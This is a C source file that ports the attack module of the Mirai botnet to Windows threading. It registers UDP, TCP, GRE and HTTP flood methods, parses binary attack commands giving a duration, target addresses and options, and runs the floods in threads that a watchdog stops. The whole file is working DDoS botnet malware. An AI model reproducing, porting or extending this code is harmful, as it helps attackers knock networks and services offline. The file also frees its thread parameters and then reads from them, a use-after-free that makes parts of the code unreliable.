// Complete Windows implementation of attack.c
// Replaces fork() with Windows threading model

#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <process.h>
#pragma comment(lib, "ws2_32.lib")

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"

// Attack state management
static CRITICAL_SECTION attack_lock;
static BOOL lock_initialized = FALSE;
static HANDLE attack_threads[ATTACK_CONCURRENT_MAX] = {0};
static volatile BOOL attack_running[ATTACK_CONCURRENT_MAX] = {0};
static time_t attack_start_time[ATTACK_CONCURRENT_MAX] = {0};
static int attack_duration[ATTACK_CONCURRENT_MAX] = {0};

// Attack method registry
uint8_t methods_len = 0;
struct attack_method {
    ATTACK_VECTOR vector;
    ATTACK_FUNC func;
};
static struct attack_method *methods = NULL;

// Thread parameter structure
struct attack_thread_params {
    int slot;
    int duration;
    ATTACK_VECTOR vector;
    uint8_t targets_len;
    struct attack_target *targets;
    uint8_t opts_len;
    struct attack_option *opts;
};

// Forward declarations of attack functions from attack_udp.c, attack_tcp.c, etc.
extern void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_udp_vse(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_udp_dns(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_tcp_stomp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_gre_ip(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_gre_eth(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
extern void attack_app_http(uint8_t, struct attack_target *, uint8_t, struct attack_option *);

// Helper function to register attack methods
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    methods = realloc(methods, (methods_len + 1) * sizeof(struct attack_method));
    methods[methods_len].vector = vector;
    methods[methods_len].func = func;
    methods_len++;
}

// Attack thread watchdog - terminates attack after duration expires
static unsigned __stdcall attack_watchdog_thread(void *param)
{
    int slot = (int)(intptr_t)param;
    int duration = attack_duration[slot];

#ifdef DEBUG
    printf("[attack] Watchdog started for slot %d, duration %d seconds\n", slot, duration);
#endif

    Sleep(duration * 1000);

    if (attack_running[slot])
    {
#ifdef DEBUG
        printf("[attack] Watchdog terminating attack in slot %d\n", slot);
#endif
        attack_running[slot] = FALSE;
        
        if (attack_threads[slot] != NULL)
        {
            TerminateThread(attack_threads[slot], 0);
            CloseHandle(attack_threads[slot]);
            attack_threads[slot] = NULL;
        }
    }

    return 0;
}

// Main attack thread
static unsigned __stdcall attack_main_thread(void *param)
{
    struct attack_thread_params *p = (struct attack_thread_params *)param;
    int i;

#ifdef DEBUG
    printf("[attack] Attack thread started in slot %d, vector %d\n", p->slot, p->vector);
#endif

    // Find and execute the attack method
    for (i = 0; i < methods_len; i++)
    {
        if (methods[i].vector == p->vector)
        {
#ifdef DEBUG
            printf("[attack] Executing attack vector %d\n", p->vector);
#endif
            // Call the attack function
            methods[i].func(p->targets_len, p->targets, p->opts_len, p->opts);
            break;
        }
    }

    // Cleanup
    if (p->targets != NULL)
        free(p->targets);
    if (p->opts != NULL)
    {
        for (i = 0; i < p->opts_len; i++)
        {
            if (p->opts[i].val != NULL)
                free(p->opts[i].val);
        }
        free(p->opts);
    }
    free(p);

    attack_running[p->slot] = FALSE;

#ifdef DEBUG
    printf("[attack] Attack thread completed in slot %d\n", p->slot);
#endif

    return 0;
}

BOOL attack_init(void)
{
    int i;

    // Initialize critical section for thread safety
    if (!lock_initialized)
    {
        InitializeCriticalSection(&attack_lock);
        lock_initialized = TRUE;
    }

    // Register all attack methods
    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);

    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);

#ifdef DEBUG
    printf("[attack] Attack module initialized with %d methods\n", methods_len);
#endif

    return TRUE;
}

void attack_kill_all(void)
{
    int i;

    if (!lock_initialized)
        return;

    EnterCriticalSection(&attack_lock);

#ifdef DEBUG
    printf("[attack] Killing all ongoing attacks\n");
#endif

    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        attack_running[i] = FALSE;
        
        if (attack_threads[i] != NULL)
        {
            TerminateThread(attack_threads[i], 0);
            CloseHandle(attack_threads[i]);
            attack_threads[i] = NULL;
        }
    }

    LeaveCriticalSection(&attack_lock);

#ifdef MIRAI_TELNET
    scanner_init();
#endif
}

void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    // Read in attack duration uint32_t
    if (len < sizeof(uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof(uint32_t);
    len -= sizeof(uint32_t);

    // Read in attack ID uint8_t
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof(uint8_t);

    // Read in target count uint8_t
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if (targs_len == 0)
        goto cleanup;

    // Read in all targets
    if (len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof(struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof(ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof(ipv4_t) + sizeof(uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        set_in_addr(&targs[i].sock_addr.sin_addr, targs[i].addr);
    }

    // Read in flag count uint8_t
    if (len < sizeof(uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    // Read in all opts
    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof(struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            // Read in key uint8
            if (len < sizeof(uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            // Read in data length uint8
            if (len < sizeof(uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof(char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    attack_start(duration, vector, targs_len, targs, opts_len, opts);
    return;

cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
    {
        for (i = 0; i < opts_len; i++)
        {
            if (opts[i].val != NULL)
                free(opts[i].val);
        }
        free(opts);
    }
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, slot = -1;
    struct attack_thread_params *params;
    HANDLE watchdog_handle;

    if (!lock_initialized)
    {
#ifdef DEBUG
        printf("[attack] Attack module not initialized\n");
#endif
        return;
    }

    EnterCriticalSection(&attack_lock);

    // Find free slot
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (!attack_running[i])
        {
            slot = i;
            break;
        }
    }

    if (slot == -1)
    {
#ifdef DEBUG
        printf("[attack] All attack slots in use\n");
#endif
        LeaveCriticalSection(&attack_lock);
        return;
    }

    // Verify attack method exists
    for (i = 0; i < methods_len; i++)
    {
        if (methods[i].vector == vector)
            break;
    }

    if (i == methods_len)
    {
#ifdef DEBUG
        printf("[attack] Attack vector %d not found\n", vector);
#endif
        LeaveCriticalSection(&attack_lock);
        return;
    }

#ifdef DEBUG
    printf("[attack] Starting attack in slot %d, vector %d, duration %d\n", slot, vector, duration);
#endif

    // Prepare thread parameters
    params = calloc(1, sizeof(struct attack_thread_params));
    params->slot = slot;
    params->duration = duration;
    params->vector = vector;
    params->targets_len = targs_len;
    params->opts_len = opts_len;

    // Copy targets
    params->targets = calloc(targs_len, sizeof(struct attack_target));
    memcpy(params->targets, targs, targs_len * sizeof(struct attack_target));

    // Copy options
    if (opts_len > 0)
    {
        params->opts = calloc(opts_len, sizeof(struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            params->opts[i].key = opts[i].key;
            if (opts[i].val != NULL)
            {
                int val_len = strlen(opts[i].val);
                params->opts[i].val = calloc(val_len + 1, sizeof(char));
                memcpy(params->opts[i].val, opts[i].val, val_len);
            }
            else
            {
                params->opts[i].val = NULL;
            }
        }
    }
    else
    {
        params->opts = NULL;
    }

    // Mark slot as in use
    attack_running[slot] = TRUE;
    attack_start_time[slot] = time(NULL);
    attack_duration[slot] = duration;

    // Start attack thread
    attack_threads[slot] = (HANDLE)_beginthreadex(
        NULL,
        0,
        attack_main_thread,
        params,
        0,
        NULL
    );

    if (attack_threads[slot] == NULL)
    {
#ifdef DEBUG
        printf("[attack] Failed to create attack thread\n");
#endif
        attack_running[slot] = FALSE;
        free(params->targets);
        if (params->opts != NULL)
        {
            for (i = 0; i < params->opts_len; i++)
            {
                if (params->opts[i].val != NULL)
                    free(params->opts[i].val);
            }
            free(params->opts);
        }
        free(params);
        LeaveCriticalSection(&attack_lock);
        return;
    }

    // Start watchdog thread to terminate after duration
    watchdog_handle = (HANDLE)_beginthreadex(
        NULL,
        0,
        attack_watchdog_thread,
        (void *)(intptr_t)slot,
        0,
        NULL
    );

    if (watchdog_handle != NULL)
    {
        CloseHandle(watchdog_handle); // Detach watchdog
    }

    LeaveCriticalSection(&attack_lock);

#ifdef DEBUG
    printf("[attack] Attack started successfully in slot %d\n", slot);
#endif
}
